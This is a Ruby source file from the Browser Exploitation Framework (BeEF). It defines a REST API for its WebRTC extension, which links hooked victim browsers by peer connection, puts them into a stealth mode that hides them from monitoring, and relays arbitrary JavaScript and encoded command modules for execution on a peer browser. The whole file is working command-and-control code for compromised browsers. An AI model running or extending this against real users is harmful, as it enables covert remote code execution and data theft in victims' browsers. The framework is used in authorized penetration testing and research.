#
# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
  module Extension
    module WebRTC

      require 'base64'

      # This class handles the routing of RESTful API requests that manage the
      #   WebRTC Extension
      class WebRTCRest < BeEF::Core::Router::Router

        # Filters out bad requests before performing any routing
        before do
          config = BeEF::Core::Configuration.instance

          # Require a valid API token from a valid IP address
          halt 401 unless params[:token] == config.get('beef.api_token')
          halt 403 unless BeEF::Core::Rest.permitted_source?(request.ip)

          headers 'Content-Type' => 'application/json; charset=UTF-8',
                  'Pragma' => 'no-cache',
                  'Cache-Control' => 'no-cache',
                  'Expires' => '0'
        end

        #
        # @note Initiate two browsers to establish a WebRTC PeerConnection
        # Return success = true if the message has been queued - as this is
        #   asynchronous, you will have to monitor BeEFs event log for success
        #   messages. For instance: Event: Browser:1 received message from
        #   Browser:2: ICE Status: connected
        #
        #   Alternatively, the new rtcstatus model also records events during
        #   RTC connectivity
        #
        # Input must be specified in JSON format (the verbose option is no
        #   longer required as client-debugging uses the beef.debug)
        #
        # +++ Example: +++
        #POST /api/webrtc/go?token=5b17be64715a184d66e563ec9355ee758912a61d HTTP/1.1
        #Host: 127.0.0.1:3000
        #Content-Type: application/json; charset=UTF-8
        #
        #{"from":1, "to":2}
        #===response (snip)===
        #HTTP/1.1 200 OK
        #Content-Type: application/json; charset=UTF-8
        #
        #{"success":"true"}
        #
        # +++ Example with verbosity on the client-side +++
        #POST /api/webrtc/go?token=5b17be64715a184d66e563ec9355ee758912a61d HTTP/1.1
        #Host: 127.0.0.1:3000
        #Content-Type: application/json; charset=UTF-8
        #
        #{"from":1, "to":2, "verbose": true}
        #===response (snip)===
        #HTTP/1.1 200 OK
        #Content-Type: application/json; charset=UTF-8
        #
        #{"success":"true"}
        #
        # +++ Example with curl +++
        # curl -H "Content-type: application/json; charset=UTF-8" -v
        #  -X POST -d '{"from":1,"to":2,"verbose":true}'
        #  http://127.0.0.1:3000/api/webrtc/go\?token\=df67654b03d030d97018f85f0284247d7f49c348
        post '/go' do
          begin
            body = JSON.parse(request.body.read)

            fromhb = body['from']
            tohb = body['to']
            verbose = body['verbose']

            result = {}

            unless [fromhb,tohb].include?(nil)
              if verbose == nil 
                BeEF::Core::Models::Rtcmanage.initiate(fromhb.to_i, tohb.to_i)
                result['success'] = true
              else
                if verbose.to_s =~ (/^(true|t|yes|y|1)$/i)
                  BeEF::Core::Models::Rtcmanage.initiate(fromhb.to_i, tohb.to_i,true)
                  result['success'] = true
                else
                  BeEF::Core::Models::Rtcmanage.initiate(fromhb.to_i, tohb.to_i)
                  result['success'] = true
                end
              end
              r = BeEF::Core::Models::Rtcstatus.new(:hooked_browser_id => fromhb.to_i,
                                                :target_hooked_browser_id => tohb.to_i,
                                                :status => "Initiating..",
                                                :created_at => Time.now,
                                                :updated_at => Time.now)
              r.save
              r2 = BeEF::Core::Models::Rtcstatus.new(:hooked_browser_id => tohb.to_i,
                                                :target_hooked_browser_id => fromhb.to_i,
                                                :status => "Initiating..",
                                                :created_at => Time.now,
                                                :updated_at => Time.now)
              r2.save
            else
              result['success'] = false
            end

            result.to_json

          rescue StandardError => e
            print_error "Internal error while initiating RTCPeerConnections .. (#{e.message})"
            halt 500
          end
        end

        #
        # @note Get the RTCstatus of a particular browser (and its peers)
        # Return success = true if the message has been queued - as this is asynchronous, you will have to monitor BeEFs event log 
        #   for success messages. For instance: Event: Browser:1 received message from Browser:2: Status checking - allgood: true
        #
        # +++ Example: +++
        #GET /api/webrtc/status/1?token=5b17be64715a184d66e563ec9355ee758912a61d HTTP/1.1
        #Host: 127.0.0.1:3000
        #
        #===response (snip)===
        #HTTP/1.1 200 OK
        #Content-Type: application/json; charset=UTF-8
        #
        #{"success":"true"}
        #
        # +++ Example with curl +++
        # curl -H "Content-type: application/json; charset=UTF-8" -v
        #  -X GET http://127.0.0.1:3000/api/webrtc/status/1\?token\=df67654b03d030d97018f85f0284247d7f49c348
        get '/status/:id' do
          begin
            id = params[:id]

            BeEF::Core::Models::Rtcmanage.status(id.to_i)
            result = {}
            result['success'] = true
            result.to_json

          rescue InvalidParamError => e
            print_error e.message
            halt 400
          rescue StandardError => e
            print_error "Internal error while queuing status message for #{id} (#{e.message})"
            halt 500
          end
        end

        #
        # @note Get the events from the RTCstatus model of a particular browser
        # Return JSON with events_count and an array of events
        #
        # +++ Example: +++
        #GET /api/webrtc/events/1?token=5b17be64715a184d66e563ec9355ee758912a61d HTTP/1.1
        #Host: 127.0.0.1:3000
        #
        #===response (snip)===
        #HTTP/1.1 200 OK
        #Content-Type: application/json; charset=UTF-8
        #
        #{"events_count":1,"events":[{"id":2,"hb_id":1,"target_id":2,"status":"Connected","created_at":"timestamp","updated_at":"timestamp"}]}
        #
        # +++ Example with curl +++
        # curl -H "Content-type: application/json; charset=UTF-8" -v
        #  -X GET http://127.0.0.1:3000/api/webrtc/events/1\?token\=df67654b03d030d97018f85f0284247d7f49c348
        get '/events/:id' do
          begin
            id = params[:id]

            events = BeEF::Core::Models::Rtcstatus.all(:hooked_browser_id => id)

            events_json = []
            count = events.length

            events.each do |event|
              events_json << {
                'id' => event.id.to_i,
                'hb_id' => event.hooked_browser_id.to_i,
                'target_id' => event.target_hooked_browser_id.to_i,
                'status' => event.status.to_s,
                'created_at' => event.created_at.to_s,
                'updated_at' => event.updated_at.to_s
              }
            end
            {
              'events_count' => count,
              'events' => events_json
            }.to_json if not events_json.empty?

          rescue InvalidParamError => e
            print_error e.message
            halt 400
          rescue StandardError => e
            print_error "Internal error while queuing status message for #{id} (#{e.message})"
            halt 500
          end
        end

        #
        # @note Get the events from the RTCModuleStatus model of a particular browser
        # Return JSON with events_count and an array of events associated with command module execute
        #
        # +++ Example: +++
        #GET /api/webrtc/cmdevents/1?token=5b17be64715a184d66e563ec9355ee758912a61d HTTP/1.1
        #Host: 127.0.0.1:3000
        #
        #===response (snip)===
        #HTTP/1.1 200 OK
        #Content-Type: application/json; charset=UTF-8
        #
        #{"events_count":1,"events":[{"id":2,"hb_id":1,"target_id":2,"status":"prompt=blah","mod":200,"created_at":"timestamp","updated_at":"timestamp"}]}
        #
        # +++ Example with curl +++
        # curl -H "Content-type: application/json; charset=UTF-8" -v
        #  -X GET http://127.0.0.1:3000/api/webrtc/cmdevents/1\?token\=df67654b03d030d97018f85f0284247d7f49c348
        get '/cmdevents/:id' do
          begin
            id = params[:id]

            events = BeEF::Core::Models::Rtcmodulestatus.all(:hooked_browser_id => id)

            events_json = []
            count = events.length

            events.each do |event|
              events_json << {
                'id' => event.id.to_i,
                'hb_id' => event.hooked_browser_id.to_i,
                'target_id' => event.target_hooked_browser_id.to_i,
                'status' => event.status.to_s,
                'created_at' => event.created_at.to_s,
                'updated_at' => event.updated_at.to_s,
                'mod' => event.command_module_id
              }
            end
            {
              'events_count' => count,
              'events' => events_json
            }.to_json if not events_json.empty?

          rescue InvalidParamError => e
            print_error e.message
            halt 400
          rescue StandardError => e
            print_error "Internal error while queuing status message for #{id} (#{e.message})"
            halt 500
          end
        end

        #
        # @note Instruct a browser to send an RTC DataChannel message to one of its peers
        # Return success = true if the message has been queued - as this is asynchronous, you will have to monitor BeEFs event log 
        #   for success messages, IF ANY. 
        #
        # Input must be specified in JSON format
        #
        # +++ Example: +++
        #POST /api/webrtc/msg?token=5b17be64715a184d66e563ec9355ee758912a61d HTTP/1.1
        #Host: 127.0.0.1:3000
        #Content-Type: application/json; charset=UTF-8
        #
        #{"from":1, "to":2, "message":"Just a plain message"}
        #===response (snip)===
        #HTTP/1.1 200 OK
        #Content-Type: application/json; charset=UTF-8
        #
        #{"success":"true"}
        #
        # +++ Example with curl +++
        # curl -H "Content-type: application/json; charset=UTF-8" -v
        #  -X POST -d '{"from":1,"to":2,"message":"Just a plain message"}'
        #  http://127.0.0.1:3000/api/webrtc/msg\?token\=df67654b03d030d97018f85f0284247d7f49c348
        #
        # Available client-side "message" options and handling:
        #  !gostealth - will put the <to> browser into a stealth mode
        #  !endstealth - will put the <to> browser into normal mode, and it will start talking to BeEF again
        #  %<javascript> - will execute JavaScript on <to> sending the results back to <from> - who will relay back to BeEF
        #  <text> - will simply send a datachannel message from <from> to <to>.
        #           If the <to> is stealthed, it'll bounce the message back.
        #           If the <to> is NOT stealthed, it'll send the message back to BeEF via the /rtcmessage handler
        post '/msg' do
          begin

            body = JSON.parse(request.body.read)

            fromhb = body['from']
            tohb = body['to']
            message = body['message']

            if message === "!gostealth"
              stat = BeEF::Core::Models::Rtcstatus.first(:hooked_browser_id => fromhb.to_i, :target_hooked_browser_id => tohb.to_i) || nil
              unless stat.nil?
                stat.status = "Selected browser has commanded peer to enter stealth"
                stat.updated_at = Time.now
                stat.save
              end
              stat2 = BeEF::Core::Models::Rtcstatus.first(:hooked_browser_id => tohb.to_i, :target_hooked_browser_id => fromhb.to_i) || nil
              unless stat2.nil?
                stat2.status = "Peer has commanded selected browser to enter stealth"
                stat2.updated_at = Time.now
                stat2.save
              end
            end

            result = {}

            unless [fromhb,tohb,message].include?(nil)
              BeEF::Core::Models::Rtcmanage.sendmsg(fromhb.to_i, tohb.to_i, message)
              result['success'] = true
            else
              result['success'] = false
            end

            result.to_json

          rescue InvalidParamError => e
            print_error e.message
            halt 400
          rescue StandardError => e
            print_error "Internal error while queuing message (#{e.message})"
            halt 500
          end

        end

        #
        # @note Instruct a browser to send an RTC DataChannel message to one of its peers
        #       In this instance, the message is a Base64d encoded JS command
        #       which has the beef.net.send statements re-written
        # Return success = true if the message has been queued - as this is asynchronous, you will have to monitor BeEFs event log 
        #   for success messages, IF ANY. 
        #   Commands are written back to the rtcmodulestatus model
        #
        # Input must be specified in JSON format
        #
        # +++ Example: +++
        #POST /api/webrtc/cmdexec?token=5b17be64715a184d66e563ec9355ee758912a61d HTTP/1.1
        #Host: 127.0.0.1:3000
        #Content-Type: application/json; charset=UTF-8
        #
        #{"from":1, "to":2, "cmdid":120, "options":[{"name":"option_name","value":"option_value"}]}
        #===response (snip)===
        #HTTP/1.1 200 OK
        #Content-Type: application/json; charset=UTF-8
        #
        #{"success":"true"}
        #
        # +++ Example with curl +++
        # curl -H "Content-type: application/json; charset=UTF-8" -v
        #  -X POST -d '{"from":1, "to":2, "cmdid":120, "options":[{"name":"option_name","value":"option_value"}]}'
        #  http://127.0.0.1:3000/api/webrtc/cmdexec\?token\=df67654b03d030d97018f85f0284247d7f49c348
        #
        post '/cmdexec' do
          begin
            body = JSON.parse(request.body.read)
            fromhb = body['from']
            tohb = body['to']
            cmdid = body['cmdid']
            cmdoptions = body['options'] if body['options']
            cmdoptions = nil if cmdoptions.eql?("")

            result = {}

            unless [fromhb,tohb,cmdid].include?(nil)
              # Find the module, modify it, send it to be executed on the tohb
              
              # Validate the command module by ID
              command_module = BeEF::Core::Models::CommandModule.first(
                  :id => cmdid)
              error 404 if command_module.nil?
              error 404 if command_module.path.nil?

              # Get the key of the module based on the ID
              key = BeEF::Module.get_key_by_database_id(cmdid)
              error 404 if key.nil?

              # Try to load the module
              BeEF::Module.hard_load(key)

              # Now the module is hard loaded, find it's object and get it
              command_module = BeEF::Core::Command.const_get(
                BeEF::Core::Configuration.instance.get(
                  "beef.module.#{key}.class"
                )
              ).new(key)

              # Check for command options
              if not cmdoptions.nil?
                cmddata = cmdoptions
              else
                cmddata = []
              end

              # Get path of source JS
              f = command_module.path+'command.js'
              error 404 if not File.exists? f

              # Read file
              @eruby = Erubis::FastEruby.new(File.read(f))

              # Parse in the supplied parameters
              cc = BeEF::Core::CommandContext.new
              cc['command_url'] = command_module.default_command_url
              cc['command_id'] = command_module.command_id
              cmddata.each{|v|
                cc[v['name']] = v['value']
              }
              # Evalute supplied options
              @output = @eruby.evaluate(cc)

              # Gsub the output, replacing all beef.net.send commands
              # This needs to occur because we want this JS to send messages
              # back to the peer browser
              @output = @output.gsub(/beef\.net\.send\((.*)\);?/) {|s|
                  tmpout = "// beef.net.send removed\n"
                  tmpout += "beefrtcs[#{fromhb}].sendPeerMsg('execcmd ("
                  cmdurl = $1.split(',')
                  tmpout += cmdurl[0].gsub(/\s|"|'/, '')
                  tmpout += ") Result: ' + "
                  tmpout += cmdurl[2]
                  tmpout += ");"
                  tmpout
              }

              # Prepend the B64 version of the string with @
              # The client JS receives the rtc message, detects the @
              # and knows to decode it before execution
              msg = "@" + Base64.strict_encode64(@output)

              # Finally queue the message in the RTC queue for submission
              # from the from browser to the to browser
              BeEF::Core::Models::Rtcmanage.sendmsg(fromhb.to_i, tohb.to_i,
                                                    msg)

              result = {}
              result['success'] = true
              result.to_json
            else
              result = {}
              result['success'] = false
              result.to_json
            end

          rescue InvalidParamError => e
            print_error e.message
            halt 400
          end
        end


        # Raised when invalid JSON input is passed to an /api/webrtc handler.
        class InvalidJsonError < StandardError

          DEFAULT_MESSAGE = 'Invalid JSON input passed to /api/webrtc handler'

          def initialize(message = nil)
            super(message || DEFAULT_MESSAGE)
          end

        end

        # Raised when an invalid named parameter is passed to an /api/webrtc handler.
        class InvalidParamError < StandardError

          DEFAULT_MESSAGE = 'Invalid parameter passed to /api/webrtc handler'

          def initialize(message = nil)
            str = "Invalid \"%s\" parameter passed to /api/webrtc handler"
            message = sprintf str, message unless message.nil?
            super(message)
          end

        end

      end

    end
  end
end
